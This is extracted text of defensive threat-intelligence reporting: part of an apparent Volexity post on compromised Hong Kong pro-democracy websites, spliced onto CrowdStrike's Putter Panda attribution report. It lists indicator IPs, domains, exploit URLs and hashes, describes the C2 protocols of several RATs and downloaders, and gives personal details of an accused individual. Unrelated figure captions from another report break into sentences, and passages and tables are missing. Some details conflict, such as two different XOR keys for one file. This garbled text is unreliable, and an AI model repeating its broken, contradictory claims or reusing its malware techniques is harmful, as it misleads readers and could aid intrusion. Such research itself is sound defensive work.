particular instance it can be seen with certainty.Attackers will often upload new webshells or add simple China Chopper style
modifications to legitimate existing files in an attempt to maintain persistence to these systems.Democratic Party Hong Kong
In the last week, Volexity also observed both the English and Chinese language websites for the Democratic Party Hong Kong
compromised with the same malicious code found ont he ATD website (www.dphk.org | eng.dphk.org).DPHK is a pro-democracy
political party in Hong Kong.Like the ATD website, at the time of this writing the DPHK websites are also serving up malicious
code, so please browse with caution.During our research for this post, we also became aware of multiple public reports related to
the compromise of the DPHK website on both Twitter and via ThreatConnect.Our good friend Claudio Giurianeri posted the
following tweet on October 3, 2014

The website of the Democratic Party of Hong Kong has been compromised and still is.Let them know.#OccupyCentral

Diving further into some of the replies to this tweet is a plethora of information regarding the exploit domain java-se.com.In
particular, a tweet from Brandon Dixon with relevant data from the PassiveTotal project details several subdomains and IP
addresses associated with java-se.com.While Volexity has only observed a handful of the hostnames in the wild thus far, other
active subdomains suggest there could be additional on-going exploit or malware activity from the domain.Additional reporting on
this activity and another going back to August 2014 was also recently shared on ThreatConnect.Despite all of this attention, the
DPHK website is still compromised and references the JavaScript from the hostile domain.It is also worth noting that this is not the first time that the DPHK website has been used in a strategic web compromise.Back in
May 2011, Kaspersky Lab reported the website was being leveraged to target users with Flash Exploits.The DPHK appears to be of
high value with respect to targeting visitors.People Power â€“ Hong Kong
During the course of investigating activity related to the ATD and DPHK websites, Volexity also observed that the website of the
political coalition and pan-democratic organization People Power in Hong Kong (www.peoplepower.hk) had been compromised as
well.However, unlike the other two websites, the People Power website did not contain JavaScript modifications pointing to java-
se.com.Instead the website appears to have malicious iFrames leveraging the Chinese URL shortener 985.so.At the bottom of
several of the pages for the People Power website are four iFrames as seen in this screen shot of the website source:

Those links, with the exception of the first one, all redirect to exploit pages on the Hong Kong IP address 58.64.178.77.URL

Meta Refresh Page

hXXp://985.so/bUYj N/A (HTTP 404)
hXXp://985.so/bUYe hXXp://58.64.178.77:80/SiteLoader
hXXp://985.so/b6hW hXXp://58.64.178.77/mPlayer
hXXp://985.so/bUYf hXXp://58.64.178.77:80/0wnersh1p
These pages load scripts that conduct profiling of the system for various software, plugins, and other related information, as well as
load Java exploits designed to install malware on the target system.If successful, the exploits will install either a 32-bit or 64-bit
version of the malware.Both files are found within the Java Archives files.Below are details on each of the malware files.Filename: main.dll
File size: 13824 bytes
MD5 hash: 1befa2c2d1bfc8e87d52871c868f75fe
SHA1 hash: 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817
Notes: 32-bit version of malware, which beacons to 58.64.178.77:443.Filename: main64.dll
File size: 15872 bytes
MD5 hash: a482a84d13c76b950ce5bc7e75f4edef
SHA1 hash: c0a4b9145e0066f5c1534beddc9c666ea8eb0882
Notes: 64-bit version of malware, which beacons to 58.64.178.77:443.At the time of this writing, the People Power website is still serving up malicious code.Volexity recommends avoiding this website
and/or browsing with caution.Volexity believes a separate group of attackers is responsible for this exploit activity and that they are
not affiliated with the java-se.com operations.The Professional Commons â€“ Hong Kong
While digging deeper into pro-democratic websites in Hong Kong, Volexity also discovered peculiar code on the website of a pro-
democratic and pro-universal suffrage public policy think thank The Professional Commons (www.procommons.org.hk).In the
case of this website, there is suspicious JavaScript code that writes an iFrame pointing back to a non-existent HTML page on a hotel
website in South Korea.The code from the website can be seen in the screen shot below.The URL in question points to:

hXXp://www.hotel365.co.kr/Lnk/tw/index.html

This link does not work and will redirect a visitor back to the main page of the website.There does not appear to be any reason for
the Professional Commmons website to have a hidden iFrame link randomly placed in the middle of its HTML code.It is suspected
that this was a formerly active exploit URL.If it is actually malicious, it is possible the code could be re-activated at any time.Volexity recommend the URL and the Professional Commons website be browsed with caution.High Profile Compromised Japanese Website
The Japanese Nikkei
In early September, the APT group behind java-se.com raised its visibility on Volexityâ€™s radar following a compromise that
effectively impacted many components of the Japanese Nikkei.In the first week of September, a subdomain used to load JavaScript
code and additional files onto other Nikkei web properties such as www.nikkei.com and asia.nikkei.com was compromised.In
particular a JavaScript file loaded from parts.nikkei.com was modified to reference another JavaScript file from jre76.java-se.com
hosted on the Japanese IP address 211.125.81.203.7506 | 211.125.80.0/22 | INTERQ | JP | GMO.JP | GMO INTERNET INC.The code has since been taken down.However, in early September the JavaScript was pre-pended to the file
http://parts.nikkei.com/parts/SC/s_cDS.js as seen in the screen shot below.Like the JavaScript from the ATD and DPHK websites, Volexity was never actually able to obtain a live copy of this script.Each
request results in an HTTP 403 response from the server.Volexity suspects the code was either active at select times and/or was
only served to a subset of visitors.The code has not been observed on the s_cDS.js file for nearly a month now.Live Exploits, Stolen Certificates, and Signed Malware
While tracking this APT activity, Volexity has also come across other seemingly unrelated compromises of websites in Hong Kong
and Japan associated with the java-se.com activity.Despite several sites being compromised, the above activity tied to java-se.com
did not result in the successful capture of actual exploit code or malware.However, research into other websites and activity
involving java-se.com did lead Volexity to live exploits and malware.In particular Volexity came across live exploit code hosted at 
jdk-7u12-windows-i586.java-se.com on the Japanese IP address 210.253.96.200.7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC.This system hosted a JavaScript file, which in turned loads a malicious Java Applet.In testing the the Java Applet pops up a
notification to the user asking them if they want to run the applet.Volexity has not had enough time to thoroughly analyze the file
to see if it is an actual exploit or if the attackers rely on user assisted malware installation.The pop-up does make it appear as if the
file is an update to Java.The popup displayed by Java is displayed below.As can be seen in the image above, this popup could be misconstrued by a user as an update to Java despite the java-se.com domain
and the Publisher being listed as WindySoft.Interestingly the Java Archive being loaded is digitally signed by a certificate issued
to WindySoft, an online gaming company from South Korea.We cannot confirm this certificate actually belonged to WindySoft at
any point in time, however, there is fairly established precedent of certificates from online gaming companies being used to
digitally sign malware and attack tools.PlugX Strikes Again â€“ Digitally Signed & Using 163.com Blogs
As one might expect, choosing to press the Run button would be bad news for someone presented with this prompt.If one were to
click Run from this prompt, it would result in the file css.jpg being download over an encrypted channel from a folder on
https://elsa-jp.jp.Note that elsa-jp.jp is a website hosted on the same IP address jdk-7u12-windows-i586.java-se.com and is likely
compromised.The file css.jpg is of course not a JPEG file, it is an executable that has been encoded with the single-byte XOR key
0xFF.Filename: css.jpg
File size: 168776 bytes
MD5 hash: b3a9e6548fb3cc511096af4d68b2e745
SHA1 hash: 394703d1240ccd3aaeeef50c212313e3036741b1
Notes: Executable file downloaded by Java Applet that has been encoded with XOR 0Ã—99

Taking a closer look at the resulting executable we have, it turns out it is a newer sample of PlugX.In this particular sample an
interesting and notable string was observed:

C:\wocawocawoca\piao\Release\caca.pdb

Also of interest is that as observed from the Java Applet, the executable is also digitally signed by a certificate issued to â
€œWindySoft.â€​

 

 
Upon execution the malware sample immediately does a DNS resolution for the following hostname:

jduhf873jdu7.blog.163.com

The PlugX sample connects to the blog and parses the page for a command for where to connect to next.This is very similar to the
method described by FireEye in their blog on Operation Poisoned Hurricane.The primary difference being that the attackers opted
to use a 163.com Blog over a Google Code page to embed the command.Taking a closer look at the Blog page the following post is
observed:

The primary string to focus on is in the title of the post:
DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS
Using the same decoding routine describe by Cassidian in a PlugX post of theirs from earlier this year, we can see this command
decodes to instruct the malware to connect to a U.S.-based Linode IP address at Hurricane Electric: 173.255.217.77.6939 | 173.255.208.0/20 | HURRICANE | US | LINODE.COM | LINODE

A look at passive DNS identifies several hostnames that recently resolved to the IP address.The ones that still resolve to the IP are
listed below:

dns.apasms.com
ns.gpass1.org
ns1.gpass1.org

These hostnames may be related but at the time of this writing we have not seen them in use in malware and are unable to confirm.Conclusion
As we have seen for several years now, dissenting groups, especially those seeking increased levels of freedom frequently find
themselves targeted for surveillance and information extraction.In the digital age, a strategic web compromise (exploit drive-by)
has become a key weapon of choice for to conduct such operations.These types of attacks are far from overt, as a typical target and
victim opted to go on their own to what they believe should be a safe and trusted website.In the case of this post, it appears that at
least two different attackers were involved in compromising and placing malicious code on Pro-Democratic websites in Hong
Kong.This is not the first time and surely will not be the last time that those in favor of democracy in Hong Kong will be targeted.Unfortunately with the level of access and infrastructure the attackers appear to have, this is quite an uphill battle.Continuing to
expose these attack is one means that shines light on these attack operations with an aim at putting a dent in their success.CrowdStrike                                                                                                                                   Putter Panda


Intelligence
Report




Crowdstrike Global Intelligence Team
This report is part of the series of technical and strategic reporting available to CrowdStrike Intelligence subscribers.It is being released publicly
to expose a previously undisclosed PLA unit involved in cyberespionage against Western technology companies.In May 2014, the U.S. Department of Justice charged five Chinese nationals for economic espionage against U.S.
corporations.The five known state actors are officers in Unit 61398 of the Chinese People’s Liberation Army (PLA).In
response, the Chinese government stated that the claims were “absurd” and based on “fabricated facts”.China then went
even further, stating “The Chinese government, the Chinese military and their relevant personnel have never engaged or
participated in cyber theft of trade secrets.”

We believe that organizations, be they governments or corporations, global or domestic, must keep up the pressure and hold
China accountable until lasting change is achieved.Not only did the U.S. Government offer in its criminal indictment the
foundation of evidence designed to prove China’s culpability in electronic espionage, but also illustrated that the charges
are only the tip of a very large iceberg.Those reading the indictment should not conclude that the People’s Republic of
China (PRC) hacking campaign is limited to five soldiers in one military unit, or that they solely target the United States
government and corporations.Rather, China’s decade-long economic espionage campaign is massive and unrelenting.Through widespread espionage campaigns, Chinese threat actors are targeting companies and governments in every
part of the globe.At CrowdStrike, we see evidence of this activity first-hand as our services team conducts Incident Response investigations
and responds to security breaches at some of the largest organizations around the world.We have first-hand insight into the
billions of dollars of intellectual property systematically leaving many of the largest corporations - often times unbeknownst
to their executives and boards of directors.The campaign that is the subject of this report further points to espionage activity outside of Unit 61398, and reveals
the activities of Unit 61486.Unit 61486 is the 12th Bureau of the PLA’s 3rd General Staff Department (GSD) and is
headquartered in Shanghai, China.The CrowdStrike Intelligence team has been tracking this particular unit since 2012,
under the codename PUTTER PANDA, and has documented activity dating back to 2007.The report identifies Chen Ping,
aka cpyy, and the primary location of Unit 61486.This particular unit is believed to hack into victim companies throughout the world in order to steal corporate trade
secrets, primarily relating to the satellite, aerospace and communication industries.With revenues totaling $189.2 billion
in 2013, the satellite industry is a prime target for espionage campaigns that result in the theft of high-stakes intellectual
property.While the gains from electronic theft are hard to quantify, stolen information undoubtedly results in an improved
competitive edge, reduced research and development timetables, and insight into strategy and vulnerabilities of the
targeted organization.Parts of the PUTTER PANDA toolset and tradecraft have been previously documented, both by CrowdStrike, and in open
source, where they are referred to as the MSUpdater group.This report contains details on the tactics, tools, and techniques
used by PUTTER PANDA, and provides indicators and signatures that can be leveraged by organizations to protect
themselves against this activity.Our Global Intelligence Team actively tracks and reports on more than 70 espionage groups,
approximately half of which operate out of China and are believed to be tied to the Chinese government.This report is part
of our extensive intelligence library and was made available to our intelligence subscribers in April 2014, prior to the
US Government’s criminal indictment and China’s subsequent refusal to engage in a constructive dialog.Targeted economic espionage campaigns compromise technological advantage, diminish global competition, and ultimately
have no geographic borders.We believe the U.S. Government indictments and global acknowledgment and awareness
are important steps in the right direction.In support of these efforts, we are making this report available to the public to
continue the dialog around this ever-present threat.The attribution provided in this report
points to Chen Ping, aka cpyy (born on May 29, 1979), as an individual responsible for the domain
registration for the Command and Control (C2) of PUTTER PANDA malware.In addition to cpyy, the
report identifies the primary location of Unit 61486.PUTTER PANDA is a determined adversary group, conducting intelligence-gathering operations
targeting the Government, Defense, Research, and Technology sectors in the United States, with
specific targeting of the US Defense and European satellite and aerospace industries.The PLA’s GSD
Third Department is generally acknowledged to be China’s premier Signals Intelligence (SIGINT)
collection and analysis agency, and the 12th Bureau Unit 61486, headquartered in Shanghai,
supports China’s space surveillance network.Domains registered by Chen Ping were used to control PUTTER PANDA malware.These domains were
registered to an address corresponding to the physical location of the Shanghai headquarters of
12th Bureau, specifically Unit 61486.The report illuminates a wide set of tools in use by the actors,
including several Remote Access Tools (RATs).The RATs are used by the PUTTER PANDA actors to
conduct intelligence-gathering operations with a significant focus on the space technology sector.This toolset provides a wide degree of control over a victim system and can provide the
opportunity to deploy additional tools at will.They focus their exploits against popular productivity
applications such as Adobe Reader and Microsoft Office to deploy custom malware through
targeted email attacks.This report contains additional details on the tactics, tools, and techniques used by PUTTER PANDA,
and provides indicators and signatures that can be leveraged by organizations to protect
themselves against this activity.4
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team



KEY FINDINGS

➔ Putter Panda is a cyber espionage      ➔ The group has been operating since
   actor that conducts operations from       at least 2007 and has been observed
   Shanghai, China, likely on behalf of      heavily targeting the US Defense and
   the Chinese People’s Liberation Army      European satellite and aerospace
   (PLA) 3rd General Staff Department        industries.12th Bureau Unit 61486.This unit is
   supports the space based signals       ➔ They focus their exploits against
   intelligence (SIGINT) mission.popular productivity applications
                                              such as Adobe Reader and Microsoft
➔ The 12th Bureau Unit 61486,                Office to deploy custom malware
   headquartered in Shanghai, is widely       through targeted email attacks.accepted to be China’s primary
   SIGINT collection and analysis         ➔ CrowdStrike identified Chen Ping,
   agency, supporting China’s space          aka cpyy, a suspected member of
   surveillance network.the PLA responsible for procurement
                                             of the domains associated with
➔ This is a determined adversary            operations conducted by Putter
   group, conducting intelligence-           Panda.gathering operations targeting the
   Government, Defense, Research,         ➔ There is infrastructure overlap with
   and Technology sectors in the             Comment Panda, and evidence
   United States, with specific              of interaction between actors tied
   targeting of space, aerospace,            to both groups.and communications.5
Attribution
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team


Attribution
There are several pieces of evidence
to indicate that the activity tracked
by CrowdStrike as PUTTER PANDA is
attributable to a set of actors based
in China, operating on behalf of the
Chinese People’s Liberation Army (PLA).Specifically, an actor known as cpyy (Chen
Ping) appears to have been involved
in a number of historical PUTTER PANDA
campaigns, during which time he was likely
working in Shanghai within the 12th Bureau,
3rd General Staff Department (GSD).PUTTER PANDA has several connections to
actors and infrastructure tied to COMMENT
PANDA, a group previously attributed to
Unit 61398 of the PLA.Table
                                        1 shows the domains that appear
                                        to have been registered by these
                                        actors, and the original email address
                                        used where known.Table 1.C2 Domains and
                                       Original Registrant
                                       Email Addresses




                                                                                 8
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team

C2 Indicators (cont’d)
The most significant finding is that an actor known as cpyy appears to have registered a significant number
of C2 domains.This actor is discussed in the next section.Many of the domains have had their registrant information changed, likely in an attempt to obfuscate the
identity of the operators.For instance, several domains originally registered by cpyy had their email address
updated to van.dehaim@gmail.com around the end of 2009; for siseau.com the change occurred between
July 2009 and November 2009, and for vssigma.com, the change occurred between August 2009 and
December 2009.Historical registrant information for anfoundation.us, rwchateau.com, and succourtion.org
was not available prior to 2010, but it is likely that these domains were also originally registered to a personally
attributable email account.Similarly, several domains registered to
                                                                     mike.johnson_mj@yahoo.com have had
                                                                     their registrant email updated during March
                                                                     2014 (see Table 2).These registrant changes may indicate
                                                                     an increased awareness of operational
                                                                     security (OPSEC) from the PUTTER PANDA
                                                                     actors.The recent changes to the domains
                                                                     shown in Table 2 may indicate that the
      Table 2.These are shown
in Table 3, and may be used for command and control of PUTTER PANDA tools.domains from a single email
address, perhaps due to OPSEC concerns or issues with the specific email account.It is likely that PUTTER PANDA will
                                       continue to attack targets of
                                       this nature in future intelligence-
                                       gathering operations.Table 3.Adversary Groups
                                                                 During part of this timeframe (30 June 2012 - 30
                    COMMENT PANDA
                                                                 October 2012), a domain associated with COMMENT
                    Based on passive DNS records,
                                                                 PANDA resolved to this same IP address: login.several PUTTER PANDA associated
                                                                 aolon1ine.com.Additionally, for a brief period in April
                    domains have resolved to IP
                                                                 2012, update8.firefoxupdata.com also resolved to
                    address 100.42.216.230:
                                                                 this IP address.• naimap.ujheadph.com
                                                                 strancorproduct.info from November to December
• neo.ujheadph.com
                                                                 2013.In February 2014, this IP address was also
• newspace.ujheadph.com
                                                                 associated with PUTTER PANDA domain ske.hfmforum.• pasco.ujheadph.com
                                                                 com.extensively targeted European entities.2
 See http://webcache.googleusercontent.com/search?q=cache:ZZyfzC1Y0UoJ:www.urlquery.net/report.A personal blog for cpyy was found at http://cpiyy.blog.163.com/.The profile on this blog (shown in Figure 2 below) indicates that the user is male, was born on 25 May 1979,
and works for the “military/police” (其他- 军人/警察).A related CSDN profile for user cpiyy indicates that cpyy was working on or
studying these topics in 2002 and 20033.Another personal blog for cpyy (http://www.tianya.cn/1569234/bbs) appears to have last been updated in
2007.This states that the user lives in Shanghai, and has a birthdate identical to that in the 163.com blog.cpyy was also active on a social networking site called XCar, stating that he lived in Shanghai as early as
2005 through 2007; he said in a post, “Soldier’s duty is to defend the country, as long as our country is safe,
our military is excellent”4 , indicating a feeling of patriotism that could be consistent with someone who
chose a military or police-based career.Figure 3. cpyy
                                                                                             Personal Blog on
                                                                                             tianya.cn




                                                                                         3
                                                                                          See postings: http://bbs.csdn.net/users/cpiyy/topics
                                                                                         4
                                                                                          hxxp://www.xcar.com.cn/bbs/viewthread.Although
superficially the discussion is about cars, there is a
repeated word in the text, “milk yellow package” or
“custard package” or “yoke package” (奶黄包).This
could be a hacker slang word, but it is unclear as to the
definition.The conversation alludes to Linxder being the
“teacher” or “landlord” and the other aforementioned
users are his “students”.Linxder references how he has
“found jobs” for them.It is possible that this is a reference
to hacking jobs wrapped up in car metaphors.Linxder is the handle of an actor associated with
the likely Shanghai-based COMMENT PANDA group5
.Linxder, cpyy, and xiaobai have all discussed
programming and security related topics on cpyy’s site,
cpyy.org6 , which hosted a discussion forum for the 711
Network Security Team (see below).cpyy also appears to have a keen interest in
photography; his 163.com blog includes several
photographs taken by cpyy in the blog postings and
albums section.Some of these photographs also appear
                                                                 Figure 4. cpyy.chen,
in a Picasa site7 (examples are shown in Figures 5 and 6)
                                                                 from 2005, 2006,
belonging to a user cpyy.chen.This account was registered with primary email address cpyy@cpyy.net and backup email
address cpyy@hotmail.com; it listed a date of birth as 24 May 1979, consistent with cpyy’s other profiles.The
IP address 218.242.252.214 was associated with this account; it is owned by the Oriental Cable Network Co.,
Ltd., an ISP located in Shanghai.Registration on this forum shows that cpyy had an interest in security-related
programming topics, which is backed up by the postings on his personal blog and CSDN account.Figure 6.Example
                                                                                        Photograph from
                                                                                        163.com Blog
          Figure 5.Sample
          Photograph from
          cpyy.chen’s
           Picasa Albums




                                                                                                                   15
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team


     “CPYY” (cont’d)
    711 Network Security Team
    One of the sites registered to cpyy was used to host a web-based email service, along with a forum on www.cpyy.net.Both of these services were apparently run by the 711 Network Security Team (711网络安全小组), a
    group that is now likely defunct, but has previously published security-based articles that have been re-posted
    on popular Chinese hacking sites such as xfocus.net8.This digest list/bulletin board was also frequented
                                                                        by ClassicWind, an actor possibly linked to the
                                                                        Shanghai-based, PLA-sponsored adversary group
                                                                        COMMENT PANDA, as described in.An additional connection to SJTU comes from
    a C2 domain, checalla.com, used with the 4H RAT in 2008.This domain was registered to httpchen@gmail.com at the time, and this address was also used to make a posting on the GRATEFUL BBS (shown in Figure 7).The posting indicates that httpchen is located at the 闵行 (Minhang) campus of SJTU and was posting using
    IP address 58.196.156.15, which is associated with the China Education and Research Network (CERNET), a
    nationwide network managed by the Chinese Ministry of Education.It also states that httpchen is studying at
    the school of Information Security Engineering within SJTU.8
 For example, hxxp://www.xfocus.net/articles/200307/568.html
9
 This article also lists http://cpyy.vicp.net/ as the original source site, although no archived content could be recovered for this.In addition to his declaration on his personal blog that he works for the “military/

  police”, and contacts with actors such as Linxder that have been previously associated with hacking units

  within the PLA, cpyy’s Picasa site contains several photographs that hint at military connections.The most compelling pictures,
however, are found in the 宿舍
and 办公室 albums (“dormitory”
and “office”).19
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team




Above is an image from the same album of what appears to be a larger dish, in front of the Oriental Pearl
Tower, a significant landmark in Shanghai:



UNIT 61486
As mentioned above, checalla.com was used for command and control with the PUTTER PANDA 4H RAT in
2008.This domain was registered to httpchen@gmail.com, and in May 2009 the domain registration details
were updated to include a Registrant Address of “shanghai yuexiulu 46 45 202#”.A search for this location
reveals an area of Shanghai shown in Figure 812 .Figure 9 shows an enlargement of satellite imagery from within this area, depicting a facility containing
several satellite dishes within green areas, sports courts and a large office building.Source: https://www.google.com/maps/place/31%C2%B017’18.0%22N+121%C2%B027’18.7%22E/@31.2882939,121.4554673,658m/
12

data=!3m1!1e3!4m2!3m1!1s0x0:0x0


                                                                                                                20
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team




 Figure 8.Map and
 Satellite Views of
 Area of Interest in
 Shanghai




                                       Figure 9.Satellite
                                                              Imagery of Facility
                                                              Alongside Handheld
                                                              Image from cpyy




Based on the Shanghai location, and common features, it is highly likely that the location shown above
is the same as that photographed by cpyy and shown in the “office” and “dormitory” albums.Further
confirmation can be found from photos uploaded by a user on Panoramio13 who tags the image as being
located in Chabei14 , Shanghai, China (31° 17’ 18.86” N 121° 27’ 9.83” E).This image is exceptionally similar
to building shown in cpyy’s “office” album (see Figure 11 below).http://www.panoramio.com/user/3305909
13

 Alternately Romanized as Zhabei
14




                                                                                                                 22
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team



                                                              Figure 11.The same report also lists a Military Unit Cover Designator (MUCD) of 61486 for this bureau.A webpage16 published on a Chinese government site detailing theatrical performances involving members
 of the PLA lists an address of “闸北区粤秀路46号” (46 Yue Xiu Road, Zhabei District) for “总参61486部队” (61486
 Forces General Staff).A search for this location shows an identical area to that shown in Figure 8.It can therefore be concluded with high confidence that the location shown in cpyy’s imagery, along
 with the satellite images above, is the headquarters of the 12th Bureau, 3rd GSD, Chinese PLA – also
 known as Unit 61486.This unit’s suspected involvement in “space surveillance”17 and “intercept of satellite
 communications” fits with their observed targeting preferences for Western companies producing
 technologies in the space and imaging/remote sensing sectors.The size and number of dishes present in
 the area is also consistent with these activities.A build time analysis of all known samples is shown in Figure 1 below, relative to China time.Figure 1.There is also some evidence that build times are manipulated by the adversary; for
example, the sample with MD5 hash bc4e9dad71b844dd3233cfbbb96c1bd3 has a build time of 18 July 2013, but was
supposedly first submitted to VirusTotal on 9 January 2013.This shows that the attackers – at least in 2013 – were aware
of some operational security considerations and were likely taking deliberate steps to hide their origins.24
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team




Conclusions
There is strong evidence to tie cpyy, an actor who
appears to have been involved in historical PUTTER
PANDA operations, to the PLA army and a location in
Shanghai that is operated by the 12th Bureau, 3rd GSD
of the PLA (Unit 61486).Another actor tied to this activity,
httpchen, has declared publically that he was attending
the School of Information Security Engineering at SJTU.This university has previously been posited as a recruiting
ground for the PLA to find personnel for its cyber
intelligence gathering units, and there is circumstantial
evidence linked cpyy to other actors based at SJTU.Given the evidence outlined above, CrowdStrike
attributes the PUTTER PANDA group to PLA Unit 61486
within Shanghai, China with high confidence.It is likely
that this organization is staffed in part by current or
former students of SJTU, and shares some resources and
direction with PLA Unit 61398 (COMMENT PANDA).25
Technical Analysis
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team

Technical Analysis
Several RATs are used by PUTTER PANDA.The most common of these, the 4H
RAT and the 3PARA RAT, have been documented previously by CrowdStrike
in previous CrowdStrike Intelligence reporting.This analysis will be revisited
below, along with an examination of two other PUTTER PANDA tools:
pngdowner and httpclient.Two droppers have been associated with the
PUTTER PANDA toolset; these are also briefly examined below.4H RAT – EXAMPLE MD5 HASH
A76419A2FCA12427C887895E12A3442B
This RAT was first analyzed by CrowdStrike in April 2012, but a historical analysis shows that it has been in
use since at least 2007 by the PUTTER PANDA actors.A listing of metadata for known samples, including C2
                                                                                       Screenshot of Truecaller
information, is shown in Appendix 1.• A victim identifier is generated from the infected machine’s hard disk serial number, XOR’ed with the key
ldd46!yo , and finally nibble-wise encoded as upper-case ASCII characters in the range (A-P) – e.g., the
byte value 0x1F becomes “BP”.• A series of HTTP requests characterizes the RAT’s C2.The initial beacon uses a request with four parameters
(h1, h2, h3, and h4) – as shown in Figure 8 – to register the implant with the C2 server.• Communication to and from the C2 server is obfuscated using a 1-byte XOR with the key 0xBE.Other
observed exported filenames are msacem.dll and mrpmsg.dll, although the RAT has
also been observed in plain executable (EXE) format.On startup, the RAT attempts to create a file mapping named
&*SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf.This is used to prevent multiple instances of
the RAT being executed simultaneously.The RAT will then use a byte-wise subtraction-
based algorithm (using a hard-coded modulo value) to decode C2 server details
consisting of a server hostname and port number, in this example nsc.adomhn.com, port 80.The decoding algorithm is illustrated in Figure 10 below.The key and
modulo values vary on a per-sample basis.Decoded C2 settings, along with sample
metadata, are listed in Appendix 2.28
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team




                                                                                                 Figure 10.Several threads are used to handle different stages of the
 C2 protocol, such as receiving data from the server, decrypting data, and processing
 commands.Standard Windows primitives such as Events are used to synchronize
 across these threads, with a shared global structure used to hold state.redacted)




                                                                                                 Figure 11.3PARA
                                                                                                 RAT Initial Beacon




 As with the 4H RAT, the C2 protocol used by the 3PARA RAT is HTTP based, using
 both GET and POST requests.An initial request is made to the C2 server (illustrated
 in Figure 11 above), but the response value is effectively ignored; it is likely that this
 request serves only as a connectivity check, as further C2 activity will only occur
 if this first request is successful.In this case, the RAT will transmit some basic victim
 information to the C2 server along with a 256-byte hash of the hard-coded string
 HYF54&%9&jkMCXuiS.It is likely that this request functions as a means to authenticate
 the RAT to the C2 server and register a new victim machine with the controller.A
 sample request and its structure are shown in Figure 12.Database Shared by
                                                                                        DEADEYE JACKAL on Their
                                                                                        Twitter Account (names
                                                                                        redacted)




                                                                                                    Figure 13.If this fails, the RAT will fall
back to decoding the data using an 8-byte XOR with a key derived from data returned from the HashData API
with the same key string.Output data produced by tasking instructions is encrypted in the same manner as it
was decrypted and sent back to the C2 server via HTTP POST request to a URI of the form /microsoft/errorpost/
default.aspx?ID=, where the ID value is a random number in decimal representation – as with the initial request
shown in Figure 4.The set of commands supported by the RAT is somewhat limited, indicating that perhaps the RAT is intended
to be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a
compromised system (which is consistent with its support for sleeping until a certain date/time).Some of the
supported commands are implemented using C++ classes derived from a base CCommand class:


  •C CommandAttribe – Retrieve metadata for files on disk, or set certain attributes such as creation/
    modification timestamps.• CCommandCD – Change the working directory for the current C2 session.•C CommandCMD – Execute a command, with standard input/output/error Screenshot of Truecaller
    redirected over the C2 channel.Database Shared by
  • CCommandNOP – List the current working directory.DEADEYE JACKAL on Their
                                                                                  Twitter Account (names
                                                                           redacted)
However, other commands are not implemented in this way.These other commands contain functionality to:


  • Pause C2 activity for a random time interval.• Shutdown C2 activity and exit.•P rovide a date and time before which beaconing will not resume, recorded in the file C:\RECYCLER\
    restore.dat as noted above.The use of C++ classes that inherit from a base class to carry out some of the tasking commands, along
with the use of concurrency features, indicates that the developers of the RAT put some thought into the
architecture and design of their tool, although the decision to implement some commands outside of the
class-based framework is curious, and may indicate multiple developers worked on the RAT (or a single
developer with shifting preferences for his coding style).32
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team

PNGDOWNER – EXAMPLE MD5 HASH
687424F0923DF9049CC3A56C685EB9A5
The pngdowner malware is a simple tool constructed using Microsoft Visual Studio and implemented via single
C++ source code file.This sample contains a PDB path of Y:\Visual Studio 2005\Projects\branch-downer\
downer\Release\downer.pdb, but other similar paths Z:\Visual Studio 2005\Projects\pngdowner\Release\
pngdowner.pdb and Z:\Visual Studio 2005\Projects\downer\Release\downer.pdb have also been observed
in other samples.Appendix 3 lists metadata for known pngdowner samples.Initially, the malware will perform a connectivity check to a hard-coded URL (http://www.microsoft.com),
using a constant user agent Mozilla/4.0 (Compatible; MSIE 6.0;).If this request fails, the malware will attempt to
extract proxy details and credentials from Windows Protected Storage, and from the IE Credentials Store using
publicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HTTP
access.An initial request is then made to the hard-coded C2 server and initial URI – forming a URL of the form
(in this sample) http://login.stream-media.net/files/xx11/index.asp?95027775, where the numerical parameter
represents a random integer.A hard-coded user agent of myAgent is used for thisScreenshot        of Truecaller
                                                                                        request, and    subsequent
                                                                                       Database Shared by
communication with the C2 server.DEADEYE JACKAL on Their
                                                                                     Twitter Account (names
Content returned from this request to the C2 server will be saved to a file named index.dat in the user’s
                                                                                      redacted)
temporary directory (i.e., %TEMP%).This file is expected to contain a single line, specifying a URL and a
filename.The malware will then attempt to download content from the specified URL to the filename within
the user’s temporary directory, and then execute this file via the WinExec API.If this execution attempt
succeeds, a final C2 request will be made – in this case to a URL using the same path as the initial request (and
a similarly random parameter), but with a filename of success.asp.Content returned from this request will be
saved to a file, but then immediately deleted.Finally, the malware will delete the content saved from the first
request, and exit.The limited functionality, and lack of persistence of this tool, implies that it is used only as a simple download-
and-execute utility.Although the version mentioned here uses C++, along with Visual Studios Standard
Template Library (STL), older versions of the RAT (such as MD5 hash b54e91c234ec0e739ce429f47a317313), built
in 2011, use plain C. This suggests that despite the simple nature of the tool, the developers have made some
attempts to modify and perhaps modernize the code.Both versions contain debugging/progress messages
such as “down file success”.Although these are not displayed to the victim, they were likely used by the
developers as a simple means to verify functionality of their code.33
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team

 HTTPCLIENT – EXAMPLE MD5 HASH
 544FCA6EB8181F163E2768C81F2BA0B3
 Like pngdowner, the httpclient malware is a simple tool that provides a limited range of functionality and uses
 HTTP for its C2 channel.This malware also initially performs a connectivity check to www.microsoft.com using
 the hard-coded user agent Mozilla/4.0 (Compatible; MSIE 6.0;), although in this variant no attempt is made to
 extract proxy credentials.The malware will then connect to its configured C2 infrastructure (file.anyoffice.info) and perform a HTTP
 request of the form shown in Figure 14 below:




                                                                                    Screenshot of Truecaller
                                                                                                Figure 14.The
 decoded data is then checked for the string runshell.If this string is not present, the C2 request is repeated
